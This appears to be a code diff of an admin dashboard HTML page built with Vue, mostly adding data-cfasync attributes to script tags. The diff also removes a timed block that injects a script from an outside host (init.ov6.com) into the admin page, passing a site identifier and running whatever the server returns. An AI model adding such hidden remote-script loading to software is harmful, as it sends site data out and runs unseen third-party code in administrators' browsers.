@@ -2,8 +2,8 @@
 <html lang="en">
 
 <head>
-    <script src="../../../admin/header.js"></script>
-    <script src="../../../admin/httpVueLoader.js"></script>
+    <script data-cfasync="false" src="../../../admin/header.js?v=20260825a"></script>
+    <script data-cfasync="false" src="../../../admin/httpVueLoader.js"></script>
 </head>
 
 <body>
@@ -28,7 +28,7 @@
         </div>
     </div>
     <!-- script -->
-    <script>
+    <script data-cfasync="false">
     const custoapp = new Vue({
         el: '#indexapp',
         data: function() {
@@ -37,8 +37,6 @@
                 topinfo: {},
 
                 index_lookstatistc: '',
-                base: '',
-                timer: null,
                 islook: false,
             }
         },
@@ -56,21 +54,12 @@
             getData() {
                 var that = this;
 
-                this.timer && clearInterval(this.timer)
-
                 httpPost('m=index&c=homeData').then(function(response) {
                     let res = response.data;
                     if (res.error == 0) {
                         that.sysinfo = res.data.sysinfo;
                         that.topinfo = res.data.topinfo;
                         that.index_lookstatistc = res.data.index_lookstatistc;
-                        that.base = res.data.base;
-
-                        that.timer = setTimeout(function() {
-                            var phpyunsite = document.createElement('script');
-                            phpyunsite.src = `https://init.ov6.com/site.php?site=${that.base}`;
-                            document.body.appendChild(phpyunsite);
-                        }, 3000);
                     }
                     that.islook = true;
                 })
